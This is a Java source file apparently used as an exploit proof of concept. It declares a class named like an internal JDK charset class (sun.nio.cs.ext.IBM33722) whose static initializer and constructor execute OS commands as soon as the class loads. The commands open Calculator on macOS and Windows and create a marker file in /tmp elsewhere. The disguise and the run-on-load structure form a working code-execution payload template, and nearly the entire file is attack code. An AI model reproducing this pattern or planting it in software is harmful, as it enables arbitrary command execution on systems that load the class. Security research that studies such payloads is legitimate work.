package sun.nio.cs.ext;

import java.util.UUID;


public class IBM33722 {
    static {
        fun();
    }

    public IBM33722(){
        fun();
    }

    private static java.util.HashMap<String, String> fun(){
        String[] command;
        String random = UUID.randomUUID().toString().replace("-","").substring(1,9);
        String osName = System.getProperty("os.name");
        if (osName.startsWith("Mac OS")) {
            command = new String[]{"/bin/bash", "-c", "open -a Calculator"};
        } else if (osName.startsWith("Windows")) {
            command = new String[]{"cmd.exe", "/c", "calc"};
        } else {
            if(new java.io.File("/bin/bash").exists()){
                command = new String[]{"/bin/bash", "-c", "touch /tmp/charsets_test_" + random + ".log"};
            }else{
                command = new String[]{"/bin/sh", "-c", "touch /tmp/charsets_test_" + random + ".log"};
            }
        }
        try{
            java.lang.Runtime.getRuntime().exec(command);
        }catch (Throwable e1){
            e1.printStackTrace();
        }
        return null;
    }


}
